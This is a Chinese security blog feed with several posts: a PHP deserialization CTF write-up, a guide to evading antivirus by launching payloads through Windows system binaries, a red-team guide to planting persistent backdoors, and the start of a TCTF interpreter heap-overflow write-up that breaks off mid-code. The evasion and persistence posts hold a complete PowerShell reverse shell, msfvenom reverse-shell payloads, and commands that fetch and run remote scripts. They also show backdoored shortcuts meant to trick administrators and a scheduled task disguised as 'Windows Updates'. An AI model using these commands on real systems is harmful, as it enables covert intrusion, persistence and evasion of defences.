10:&quot;Demofile&quot;;s: 8:&quot;fl4g.php&quot;;&#125;&quot;</span><br><span class="line">$b &#x3D; str_replace(&#39;O: 4&#39;, &#39;O: +4&#39;,$b);&#x2F;&#x2F;绕过preg_match</span><br><span class="line">$b &#x3D; str_replace(&#39;:1 :&#39;, &#39;: 2:&#39;,$b);&#x2F;&#x2F;绕过wakeup</span><br><span class="line">echo base64_encode($b)</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>网上很多师傅会把整个类写进去，然后构建对象，然后反序列化，其实构造exp时，类中的方法是多余的，因为序列化并不会把方法也存储进去，只会存储类的属性和值，所有只需要写上属性就可以</p><p><strong>然后重点来了，反序列漏洞的实质，讲讲在下对此漏洞的理解</strong><br>我们看一下序列化的字符串O:4:“Demo”: 1 :{s: 10:“Demofile”;s: 8:“fl4g.php”;}<br>类名：Demo 属性：Demofile 值：flag.php</p><p>当服务器端接受到这个字符串然后反序列时就会检查,会发现是Demo这个类，那么服务器就看自己的类有没有Demo这个类，刚好，有，然后他就会以自己Demo的方法类来反序列化。</p><blockquote><p>这里就是漏洞的根本所在，服务器会傻乎乎的把自己的类来给攻击者用，攻击者也就利用服务器中的类来达到目的</p></blockquote><p>所有我们也就是利用这点来执行某些特定的攻击，这就是我的理解，我觉得比网上的那些要易懂一些。</p><p>那么怎么达到攻击目的？</p><blockquote><p>控制类中方法的执行流程</p></blockquote><p>就拿此次题目来说，我们构建好了序列化的字符串传入进去，然后反序列化。<br>构造函数=》__wakeup函数=&gt;析构函数 然后执行结果你会发现还是index.html这个网页<br>因为__wakeup这个方法执行了，把对象中的file属性值又变回index.html</p><p>所有我们要想法跳过这个方法，怎么跳过嘞<br>SugarCRM v6.5.23 PHP反序列化 对象注入漏洞 这个漏洞会帮助我们跳过__wakeup方法</p><p>当序列化字符串中的属性个数大于实际类属性的个数，在反序列化时就会跳过__wakeup方法</p><p>还有个问题就是怎么绕过正则匹配？<br>因为正则匹配这样的字符</p><blockquote><p>O:数字</p></blockquote><p>这写死了，也给我们提供绕过的可能。0:+4这样就不会被匹配了，也不影响反序列</p><p>最好把序列化的字符串base64编码一下就好</p><p>然后顺利拿到Flag</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1775310604.png" alt="在这里插入图片描述"></p><hr><h2 id="原理总结一句话"><a href="#原理总结一句话" class="headerlink" title="原理总结一句话"></a>原理总结一句话</h2><blockquote><p><strong>鱼目混珠，瞒天过海，借到杀人</strong></p></blockquote><p>鱼目混珠：就是你把服务器的类的名字拿来伪装，这样服务器就认为这是它自己的类</p><p>瞒天过海：你把伪装的类，拿来序列化，然后服务器拿到了你传入的序列化字符串之后，进行反序列化，他会认为，这就是它自己反序列化的类，因为类名和属性和他自己的类一模一样，不知道是外部传入的</p><p>借刀杀人：在反序列中，因为前两步，服务器在反序列化中，就会把他自己的类的方法拿来用，你就相当于借用了服务器类的方法</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>免杀技巧-执行系统命令方式总结</title>
      <link href="2020/10/04/%E5%85%8D%E6%9D%80%E6%8A%80%E5%B7%A7-%E6%89%A7%E8%A1%8C%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/"/>
      <url>2020/10/04/%E5%85%8D%E6%9D%80%E6%8A%80%E5%B7%A7-%E6%89%A7%E8%A1%8C%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<p>Msf开启会话：&gt; “在渗透测试中，常常会遇到这种情况，上传一个shell上去，连上，却发现无法调用cmd.exe无法执行系统命令，这时候你往往想着，上传一个自己的cmd.exe上去，这是一套行云流水的操作，但把环境条件在变得苛刻一点，杀毒软件将监视二进制文件，例如cmd.exe,那么你会怎么做才能逃避检测？那么接下来就会介绍一些免杀思路。”</p><hr><h2 id="01-背景"><a href="#01-背景" class="headerlink" title="01-背景"></a>01-背景</h2><p>Windows系统提供了多个二进制文件，可以使用它们执行任意命令。<br>在这，你是不是想到了什么？既然可以执行命令，那么它将帮助hacker们逃过检测，尤其是对cmd.exe监视的环境下。<br>当然这需要一些前提条件：未正确配置白名单规则（这里涵盖了文件名和路径），使得一些系统可执行文件能够执行。</p><center>接下来，让我们看看这些项免杀技术的闪光点！</center><h2 id="02-正文"><a href="#02-正文" class="headerlink" title="02-正文"></a>02-正文</h2><p>我们先用msfvenom生成一个木马程序：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;192.168.73.136 lport&#x3D;8888 -f exe -o hacker.exe</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2822817250.png"></p><p>Msf监听端口8888</p><p>Forfiles：</p><p>首先，要说明的是，forfiles是Windows Server 2003内置的命令行文件，其它系统未必适用。不过，win2003以上的系统，包括win7、windows server 2008均适用哦。forfiles 是一个命令实用程序，可以选择多个文件并在它们上运行命令，它通常用于批处理作业中，但可能会被滥用以执行任意命令或可执行文件。</p><p>语法须知：</p><p>默认搜索掩码为*，也使用参数 / p和/ m在Windows目录System32 和掩码calc.exe 上执行搜索，/ c参数之后的所有内容都是实际执行的命令。</p><p>命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">forfiles &#x2F;p c:\windows\system32 &#x2F;m calc.exe &#x2F;c C:\tmp\hacker.exe</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3962395207.png"></p><p>msf开启会话：</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1581667678.png"></p><p>毫无疑问的是，Hacker.exe 将是forfiles.exe子进程。</p><p>当然也可以用windows自带的“运行”来执行命令。</p><p>Pcalua：</p><p>进程兼容性助手是Windows实用程序，当它检测到存在兼容性问题的软件时就会运行。该实用程序位于“ C： Windows  System32 ”中，并且可以使用“ -a”参数执行命令。</p><p>命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pcalua.exe -a C:\tmp\hacker.exe</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1069225407.png"></p><p>msf打开会话：</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/4182407151.png"></p><p>值得注意的是，hacker.exe将是一个新的父进程。</p><p>后面就不一一截图了，大家自行下去验证就欧克了</p><p>SyncAppvPublishingServer：</p><p>SyncAppvPublishingServer 为启动Microsoft应用程序虚拟化（App-V）发布刷新操作，在下面的示例中，将在powershell中执行， Start-Process cmdlet用于运行可执行文件。</p><p>命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SyncAppvPublishingServer.vbs &quot;n; Start-Process C:\tmp\hacker.exe&quot;</span><br></pre></td></tr></table></figure><p>由于SyncAppvPublishingServer将执行双引号中包含的所有内容，因此还可以使用“ regsvr32 ”方法从远程位置执行恶意有效负载。</p><p>命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SyncAppvPublishingServer.vbs &quot;Break; regsvr32 &#x2F;s &#x2F;n &#x2F;u &#x2F;i:http:&#x2F;&#x2F;192.168.73.136:8080&#x2F;jnQl1FJ.sct scrobj.dll&quot;</span><br></pre></td></tr></table></figure><p>Explorer:<br>可以将explorer.exe 用作执行方法。执行的有效负载将在系统上创建一个进程，该进程将把explorer.exe作为父进程。</p><p>命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">explorer.exe C:\tmp\hacker.exeexplorer.exe &#x2F;root,&quot;C:\tmp\hacker.exe&quot;explorer.exe 0XAXSDD-Hacker, &quot;C:\tmp\hacker.exe&quot;</span><br></pre></td></tr></table></figure><p>Waitfor：<br>waitfor是Microsoft二进制文件，用于通过发送信号来跨网络同步计算机，也可用于执行任意命令或下载有效载荷。</p><p>命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">waitfor hacker &amp;&amp; PowerShell IEX(new-object net.webclient).downloadstring(&#39;http:&#x2F;&#x2F;192.168.73.136:8080&#x2F;shell&#39;);</span><br><span class="line">waitfor &#x2F;s 127.0.0.1 &#x2F;si hacker</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1278246816.png"></p><p>当然这里只总结了一些，也没总结完，但也值得学习与思考，希望能给你一个好的思路！</p>]]></content>
      
      
      <categories>
          
          <category> Gamma实验室 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 免杀技巧 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>红队技巧-持久性技巧</title>
      <link href="2020/09/30/%E7%BA%A2%E9%98%9F%E6%8A%80%E5%B7%A7-%E6%8C%81%E4%B9%85%E6%80%A7%E6%8A%80%E5%B7%A7/"/>
      <url>2020/09/30/%E7%BA%A2%E9%98%9F%E6%8A%80%E5%B7%A7-%E6%8C%81%E4%B9%85%E6%80%A7%E6%8A%80%E5%B7%A7/</url>
      
        <content type="html"><![CDATA[<blockquote><p>“今天，我将介绍关于hacker拿到一台服务器之后，如何建立持久性的后门的一些非常实用的小技巧！”</p></blockquote><h6 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h6><p>能留后门的工具很多，技术方法也很多，但是今天我将介绍一些简单并且异常实用的方法。</p><h2 id="1-快捷链接方式"><a href="#1-快捷链接方式" class="headerlink" title="1.快捷链接方式"></a>1.快捷链接方式</h2><p>对，你想的没错，我们就是创建一个快捷方式，里面的链接替换上我们的有效载荷，欺骗管理员点击，运行我们的shell和执行代码。</p><p>用社会工程学的角度来提高我们方法的可行性的几点：<br>1.替换的快捷图标可以改成一些常用的软件，但不仅限于软件，提高管理员点击的可能性。<br>2.改好的快捷方式可以放在比较显眼的地方，进一步提高可能性。<br>3.最好不要用一些没用过或者安装过软件或者其他东西的快捷链接，这可能会引起怀疑。<br>4.可以查看一波常用软件实用频率记录，比如可以从360软件管家这些第三方软考，也可直接查看控制面板中的程序实用频率。</p><p>演示：<br>我们创建一个安全狗快捷链接：<br>这里我用我的windows7虚拟机创建安全狗的快捷链接尝试实用cmd.exe起powershell执行反弹shell。<br>这里我直接用python起个简单的http服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$client &#x3D; New-Object System.Net.Sockets.TCPClient(&quot;192.168.73.136&quot;,4444);$stream &#x3D; $client.GetStream();[byte[]]$bytes &#x3D; 0..65535|%&#123;0&#125;;while(($i &#x3D; $stream.Read($bytes, 0, $bytes.Length)) -ne 0)&#123;;$data &#x3D; (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback &#x3D; (iex $data 2&gt;&amp;1 | Out-String );$sendback2 &#x3D; $sendback + &quot;# &quot;;$sendbyte &#x3D; ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()&#125;;$client.Close()</span><br></pre></td></tr></table></figure><p>把上述代码另存为shell.ps1<br>点开快捷链接属性，替换target为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd &#x2F;c “powershell IEX (New-Object Net.WebClient).DownloadString(\&quot;http:&#x2F;&#x2F;192.168.73.136&#x2F;shell.ps1\&quot;);”</span><br></pre></td></tr></table></figure><p>再把快捷链接图标换了，然后一个后门快捷方式就做好了</p><blockquote><p><strong>弊端：</strong>但是这种方式有个很严重的弊端，就是执行了cmd 窗口会弹出来，这就很狗带，期间我也想过如何把这个玩意关掉，但是从理论上感觉不太行，各位师傅可以自行研究一番，我可能太菜了，没玩明白！结束cmd进程，相应的shell也会死掉，期间想过各种方式，方法，但都没用，这是一个很烧脑的东西！</p></blockquote><p><strong>优化：</strong><br>我们完全可以用木马可执行文件来替换cmd执行powershell，这样后台将不会有任何操作显示，这样隐蔽一点，只需要把木马可执行文件绝对路径替换成链接的target就行了，这里仅提供一个思路，后续研究各位请继续。</p><p>你以为这就结束了？不，还能玩玩。</p><p>进一步优化：<br>前面虽然执行了木马文件，但是真正链接的程序我们并没用执行，而是被替换掉了，这样就会让人引起怀疑，就会猜测是不是路径错了，一打开快捷方式属性，然后就露馅了嘛，所以我又自己瞎倒腾！</p><p>首先建立一个bat文件，文件内容为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">@start C:\\Users\\hacker\\Desktop\\msf.exe&#x2F;&#x2F;启动恶意程序</span><br><span class="line">@&quot;C:\\Program Files (x86)\SafeDog\SafeDogSiteApache\SafeDogSiteApache.exe&quot; &#x2F;&#x2F;启动正常程序</span><br></pre></td></tr></table></figure><p>然后快捷方式链接换成这个bat文件的链接，这样将会即执行了反弹shell，又会执行正常程序，能有效降低管理员的怀疑。</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1111221192.png"></p><p>但是最后还是会有个cmd框，难受，但是没显示出执行的命令，还是有点优化效果的！</p><h2 id="2-计划任务方式"><a href="#2-计划任务方式" class="headerlink" title="2. 计划任务方式"></a>2. 计划任务方式</h2><p>计划任务是一个很棒的后门方法，因为根本不需要用户交互，不需要高的权限，普通用户也可以写，是一款易于使用的方法。</p><p>这里我设置了定时任务，命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks  &#x2F;create  &#x2F;tn  testschtask &#x2F;tr C:&#x2F;Users&#x2F;hacker&#x2F;Desktop&#x2F;msf.exe   &#x2F;sc  DAILY &#x2F;st  15:33:00</span><br></pre></td></tr></table></figure><p>当然你完全可以设置一分钟就执行一次，例如这里我创建了一个windows updates任务，每分钟执行一次，你只需要把PATH替换成你的恶意程序路径就行了，命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks &#x2F;create &#x2F;sc minute &#x2F;mo 1 &#x2F;tn &quot;Windows Updates&quot; &#x2F;tr &quot;PATH&quot; </span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1197887660.png"></p><p>这样是非常nice的，是非常隐蔽实用的，你只需要在哪里监听，就会获得甜美的shell。</p><h2 id="3-Powershell配置文件："><a href="#3-Powershell配置文件：" class="headerlink" title="3. Powershell配置文件："></a>3. Powershell配置文件：</h2><p>PowerShell配置文件是一个PowerShell脚本，您可以对其进行自定义，并将其特定于会话的元素添加到您启动的每个PowerShell会话中。它是一个在PowerShell启动时运行的脚本，你可以使用配置文件作为登录脚本来自定义环境，你可以添加命令，功能，别名，模块等。此外PowerShell支持多个配置文件，PowerShell主机程序可以支持其自己的主机特定配置文件。</p><p>一些样例：<br><img src="https://raw.githubusercontent.com/MssnHarvey/cloudimg/main/img/1344353250.png"></p><p>PowerShell配置文件脚本存储在文件夹“ WindowsPowerShel”中，默认情况下对用户隐藏。如果有效负载已放入磁盘，则可以使用。</p><p>cmdlet指向可执行文件的位置，命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">start-Process</span><br></pre></td></tr></table></figure><p>确定当前用户的配置文件是否存在，命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">test-Path $ profile</span><br></pre></td></tr></table></figure><p>如果配置文件不存在，将为当前用户创建一个配置文件，命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">new-Item -Path $ Profile -Type File -Force</span><br></pre></td></tr></table></figure><p>重写该配置文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">out-File</span><br></pre></td></tr></table></figure><p>演示：</p><p><img src="https://raw.githubusercontent.com/MssnHarvey/cloudimg/main/img/3630881312.png"></p><p>这样我每打开一个新的powershell窗口，将会执行恶意程序！<br><img src="https://raw.githubusercontent.com/MssnHarvey/cloudimg/main/img/136724488.png"></p><p>演示所用的命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">echo $profile</span><br><span class="line">test-Path $profile</span><br><span class="line">new-Item -Path $profile -Type File –Force</span><br><span class="line">$string &#x3D; &#39;Start-Process &quot;C:\\Users\\hacker\Desktop\\msf.exe&quot;&#39;</span><br><span class="line">$string | Out-File -FilePath &quot;C:\Users\hacker\Documents\WindowsPowerShell\Microsoft.PowerShell_profile.ps1&quot; -Append</span><br></pre></td></tr></table></figure><p>与启动进程类似，“ Invoke-Item ” cmdlet可用于执行项目的默认操作，即运行文件，打开应用程序等。launcher.bat是Empire生成的有效负载，具有自我删除的能力作为更秘密的选择执行时，因为它不会创建新进程。</p><p>所需要的命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">echo $profile</span><br><span class="line">test-Path $profile</span><br><span class="line">new-Item -Path $profile -Type File –Force</span><br><span class="line">add-Content $profile &quot;Invoke-Item C:\tmp\launcher.bat&quot;</span><br><span class="line">$string | Out-File -FilePath &quot;C:\Users\hacker\Documents\WindowsPowerShell\Microsoft.PowerShell_profile.ps1&quot; -Append</span><br></pre></td></tr></table></figure><p>这样当PowerShell在系统上再次启动时，将执行该文件，并且代理将与命令和控件进行通讯。执行过程不会像上面的示例那样在系统上创建新进程，而是使用现有的PowerShell进程，更为隐蔽。</p><p>cmdlet“ Invoke-Command ”的用法中允许执行命令，所以regsvr32方法可以用作隐藏选项，因为它可以规避未正确配置的应用程序白名单解决方案，并且可以从远程执行scriptlet。</p><p>参考命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">echo $profile</span><br><span class="line">test-Path $profile</span><br><span class="line">new-Item -Path $profile -Type File –Force</span><br><span class="line">$string &#x3D; &#39;Invoke-Command -ScriptBlock &#123; regsvr32 &#x2F;s &#x2F;n &#x2F;u &#x2F;i:http:&#x2F;&#x2F;192.168.73.136:80&#x2F;jWcEbr.sct scrobj.dll &#125;&#39;</span><br><span class="line">$string | Out-File -FilePath &quot;C:\Users\hacker\Documents\WindowsPowerShel</span><br></pre></td></tr></table></figure><p>Metasploit框架包含一个模块（web_delivery），该模块可以生成并提供恶意scriptlet文件。但是，其他命令或者控制（C2）框架（例如PoshC2）也支持此功能，并且与Metasploit相比，可以提供扩展的功能。</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1251912728.png"></p><p>注意：使用多个命令对PowerShell配置文件进行大量修改会向用户发送一条有关增加加载时间的消息。但是，执行一个命令不会产生任何消息，有效负载将在后台运行，并且用户不会注意到任何异常。</p>]]></content>
      
      
      <categories>
          
          <category> Gamma实验室 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Redteam </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>TCTF Final WP</title>
      <link href="2020/09/29/TCTF%20Final%20WP/"/>
      <url>2020/09/29/TCTF%20Final%20WP/</url>
      
        <content type="html"><![CDATA[<h1 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h1><p>题目给了一个ruby解释器<a href="https://github.com/embedded2015/rubi%EF%BC%8C%E5%B9%B6%E5%AF%B9%E5%AE%83%E5%81%9A%E4%BA%86patch%EF%BC%9A">https://github.com/embedded2015/rubi，并对它做了patch：</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">diff --git a/engine.c b/engine.c</span><br><span class="line">index 79e83d2.<span class="number">.2350</span>d59 <span class="number">100644</span></span><br><span class="line">--- a/engine.c</span><br><span class="line">+++ b/engine.c</span><br><span class="line"><span class="meta">@@ -<span class="number">137</span>,<span class="number">6</span> +<span class="number">137</span>,<span class="number">11</span> @@ static int execute(<span class="params">char *source</span>)</span></span><br><span class="line">     init();</span><br><span class="line">     lex(source);</span><br><span class="line">     parser();</span><br><span class="line">+    long memsz = <span class="number">0xFFFF</span> + <span class="number">1</span>;</span><br><span class="line">+    <span class="keyword">if</span> (mprotect(ntvCode, memsz, PROT_READ | PROT_EXEC)) &#123;</span><br><span class="line">+        perror(<span class="string">&quot;mprotect&quot;</span>);</span><br><span class="line">+        exit(<span class="number">1</span>);</span><br><span class="line">+    &#125;</span><br><span class="line">     ((<span class="built_in">int</span> (*)(<span class="built_in">int</span> *, void **)) ntvCode)(<span class="number">0</span>, funcTable);</span><br><span class="line">     dispose();</span><br><span class="line">     <span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure><p>也就是我们要挖这个解释器的rce。</p><h1 id="寻找漏洞点"><a href="#寻找漏洞点" class="headerlink" title="寻找漏洞点"></a>寻找漏洞点</h1><h2 id="1-堆溢出："><a href="#1-堆溢出：" class="headerlink" title="1.堆溢出："></a>1.堆溢出：</h2><p>首先我们发现了一个堆溢出，是函数名和变量名的地方，写死了为255 / 32，而输入长度是任意的，会导致堆溢出：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">typedef struct &#123;</span><br><span class="line">    char name[<span class="number">32</span>];</span><br><span class="line">    unsigned <span class="built_in">int</span> <span class="built_in">id</span>;</span><br><span class="line">    <span class="built_in">int</span> <span class="built_in">type</span>;</span><br><span class="line">    <span class="built_in">int</span> loctype;</span><br><span class="line">&#125; Variable;</span><br><span class="line">static Variable *appendVar(char *name, <span class="built_in">int</span> <span class="built_in">type</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (functions.inside == IN_FUNC) &#123;</span><br><span class="line">        int32_t sz = <span class="number">1</span> + ++varSize[nowFunc];</span><br><span class="line">        strcpy(locVar[nowFunc][varCounter].name, name);</span><br><span class="line">        locVar[nowFunc][varCounter].<span class="built_in">type</span> = <span class="built_in">type</span>;</span><br><span class="line">        locVar[nowFunc][varCounter].<span class="built_in">id</span> = sz;</span><br><span class="line">        locVar[nowFunc][varCounter].loctype = V_LOCAL;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> &amp;locVar[nowFunc][varCounter++];</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (functions.inside == IN_GLOBAL) &#123;</span><br><span class="line">        /* <span class="keyword">global</span> varibale */</span><br><span class="line">        strcpy(gblVar.var[gblVar.count].name, name);</span><br><span class="line">        gblVar.var[gblVar.count].<span class="built_in">type</span> = <span class="built_in">type</span>;</span><br><span class="line">        gblVar.var[gblVar.count].loctype = V_GLOBAL;</span><br><span class="line">        gblVar.var[gblVar.count].<span class="built_in">id</span> = (uint32_t) &amp;ntvCode[ntvCount];</span><br><span class="line">        ntvCount += sizeof(int32_t); /* <span class="built_in">type</span> */</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> &amp;gblVar.var[gblVar.count++];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> NULL;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">typedef struct &#123;</span><br><span class="line">    <span class="built_in">int</span> address, args;</span><br><span class="line">    char name[<span class="number">0xFF</span>];</span><br><span class="line">&#125; func_t;</span><br><span class="line">static func_t *appendFunc(char *name, <span class="built_in">int</span> address, <span class="built_in">int</span> args)</span><br><span class="line">&#123;</span><br><span class="line">    functions.func[functions.count].address = address;</span><br><span class="line">    functions.func[functions.count].args = args;</span><br><span class="line">    strcpy(functions.func[functions.count].name, name);</span><br><span class="line">    <span class="keyword">return</span> &amp;functions.func[functions.count++];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是通过调试发现这个洞触发太早，导致覆盖了后面的nline，理论上nline在语法正确的时候不应该被用到，我们继续调试，发现分词的时候，在strncat处崩了：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">typedef struct &#123; char val[<span class="number">32</span>]; <span class="built_in">int</span> nline; &#125; Token;</span><br><span class="line">struct &#123;</span><br><span class="line">    Token *tok;</span><br><span class="line">    <span class="built_in">int</span> size, pos;</span><br><span class="line">&#125; tok;</span><br><span class="line">int32_t lex(char *code)</span><br><span class="line">&#123;</span><br><span class="line">    int32_t codeSize = strlen(code), line = <span class="number">1</span>;</span><br><span class="line">    int32_t is_crlf = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (int32_t i = <span class="number">0</span>; i &lt; codeSize; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (tok.size &lt;= i)</span><br><span class="line">            tok.tok = realloc(tok.tok, (tok.size += <span class="number">512</span> * sizeof(Token)));</span><br><span class="line">        if (isdigit(code[i])) &#123; // number?</span><br><span class="line">            <span class="keyword">for</span> (; isdigit(code[i]); i++)</span><br><span class="line">                strncat(tok.tok[tok.pos].val, &amp;(code[i]), <span class="number">1</span>);</span><br><span class="line">            tok.tok[tok.pos].nline = line;</span><br><span class="line">            i--;</span><br><span class="line">            tok.pos++;</span><br><span class="line">        &#125; else if (isalpha(code[i])) &#123; // ident?</span><br><span class="line">            char *<span class="built_in">str</span> = tok.tok[tok.pos].val;</span><br><span class="line">            <span class="keyword">for</span> (; isalpha(code[i]) || isdigit(code[i]) || code[i] == <span class="string">&#x27;_&#x27;</span>; i++)</span><br><span class="line">                *<span class="built_in">str</span>++ = code[i]; // &lt; -- overwrite</span><br><span class="line">            tok.tok[tok.pos].nline = line;</span><br><span class="line">            i--;</span><br><span class="line">            tok.pos++;</span><br><span class="line">          &#125; else if (isalpha(code[i])) &#123; // ident?</span><br><span class="line">            char *<span class="built_in">str</span> = tok.tok[tok.pos].val;</span><br><span class="line">            <span class="keyword">for</span> (; isalpha(code[i]) || isdigit(code[i]) || code[i] == <span class="string">&#x27;_&#x27;</span>; i++)</span><br><span class="line">                *<span class="built_in">str</span>++ = code[i];</span><br><span class="line">            tok.tok[tok.pos].nline = 